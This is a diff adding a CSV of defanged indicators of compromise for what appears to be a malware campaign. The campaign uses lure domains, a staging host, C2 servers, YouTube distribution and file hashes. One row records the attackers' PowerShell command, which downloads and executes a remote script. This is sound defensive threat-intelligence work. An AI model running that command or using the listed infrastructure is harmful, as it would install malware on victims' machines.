@@ -1,0 +1,38 @@
+type,value_defanged,first_seen,role,verdict,confidence,source
+domain,quantai[.]io,2026-09-11,lure,malicious,high,Wayback Machine
+domain,quantai[.]net,2026-10-26,lure,malicious,high,urlscan.io
+domain,quant-pro[.]com,2026-11-09,lure,malicious,high,analyst triage
+domain,quantai[.]app,2026-04-21,lure,malicious,high,Wayback Machine; analyst triage
+domain,quant-pro[.]ai,2026-11-09,lure,candidate,low,analyst triage
+domain,chartsgpt[.]com,2026-10-26,stage,malicious,high,urlscan.io; RDAP
+url,hxxps://chartsgpt.com/quant.php?Dio=<COMPUTERNAME>,2026-10-30,stage,malicious,high,urlscan.io; analyst triage
+url,hxxps://chartsgpt.com/ps.php,2026-11-09,stage,malicious,high,analyst triage
+url,hxxps://chartsgpt.com/ps2.php,2026-10-30,stage,malicious,high,urlscan.io
+url,hxxps://chartsgpt.com/boka.7z,2026-11-09,stage,malicious,high,analyst triage
+url,hxxps://chartsgpt.com/smow.7z,2026-11-09,stage,malicious,high,analyst triage
+url,hxxps://chartsgpt.com/vh.exe,2026-11-09,stage,malicious,high,analyst triage
+domain,sonosarcsounds[.]com,2026-06-15,c2,malicious,high,RDAP; config file
+domain,sonosarcsounds[.]net,2026-06-15,c2,malicious,high,RDAP; config file
+ipv4,192[.]69[.]210[.]252,2026-11-01,c2,malicious,high,Shodan
+endpoint,192[.]69[.]210[.]252:2084,2026-11-09,c2,malicious,high,config file
+endpoint,192[.]69[.]210[.]252:1337,2026-11-01,c2,malicious,med,Shodan
+youtube-channel,UCXB43fOyaJWD1o092fOF5Iw,2026-11-05,distribution,malicious,high,YouTube metadata
+youtube-video,RKeu00DiDzw,2026-11-05,distribution,malicious,high,YouTube metadata
+youtube-video,D_b9HgmrS4Y,2026-11-05,distribution,malicious,high,YouTube metadata
+sha256,52004733e5b056318cf87f33fe8039e8e3248f1a418b326f84c2a61ff52f7c23,2026-09-11,lure-kit-asset(2.jpg),malicious,high,urlscan.io; Wayback Machine
+sha256,d65aba2368a8bbb5eb9d55504d2fbffa5c1febf144f1124291d0d126e68ee313,2026-10-28,lure-kit-asset(4.jpg),malicious,high,urlscan.io
+sha256,985d31edfbf92f66fcd5934c7512173bf8a146f41b11009dd769325f777fa58e,2026-10-28,lure-kit-asset(5.jpg),malicious,high,urlscan.io
+sha256,675366f67703c32224abd7040063fd3ca53301ec99af0ae55ec9da58dbbfec9b,2026-10-26,lure-kit-asset(favicon.ico quantai[.]net 648B),malicious,high,urlscan.io
+sha256,dc71c941eaf5aec28a7d7faa3acaf632fc26cee7b75559c175e43661827e1f9f,2026-09-11,lure-kit-asset(favicon.ico quantai[.]io 3459B; shodan mmh3 -888936931),malicious,high,Wayback Machine
+sha256,7c40a7a42508dfe5f81ff77aa386bdf23d163625ef3c60749ff2e6db4869baf4,2026-09-11,lure-kit-asset(styles.css quantai[.]io),malicious,med,Wayback Machine
+sha256,f1c5a19c45a7fda2e55e994f002dbeae6063efe974438689038d4e30c134610f,2026-10-28,lure-kit-asset(styles.css quantai[.]net),malicious,med,urlscan.io
+turnstile-sitekey,0x4AAAAAAEPGVgD_srJzXb7_,2026-09-11,lure,malicious,high,page source
+turnstile-sitekey,0x4AAAAAAF0eiSwGvAzjJ92v,2026-10-26,lure,malicious,high,page source
+turnstile-sitekey,0x4AAAAAAFzmIWEaVA5Cq1V8,2026-11-09,lure,malicious,high,page source
+turnstile-sitekey,0x4AAAAAADnC0ViZ3yjajUEI,2026-11-09,lure,malicious,high,page source
+netsupport-licensee,NSM1234,2026-08-25,c2,malicious,med,licence file
+cert-cn,DESKTOP-VIG3E9V,2026-10-02,c2,candidate,low,Shodan
+cert-serial,25:59:22:98:98:22:5a:af:4d:71:14:de:05:b0:88:78,2026-10-02,c2,candidate,low,Shodan
+path,%LOCALAPPDATA%\Stoservice\stservice.exe,2026-11-09,payload,malicious,high,analyst triage
+command,"irm ""hxxps://chartsgpt.com/quant.php?Dio=$($env:COMPUTERNAME)"" | iex",2026-11-09,stage,malicious,high,analyst triage
+ipv4,45[.]91[.]202[.]58,2026-11-10,c2,malicious,high,DNS resolution; check-host.net
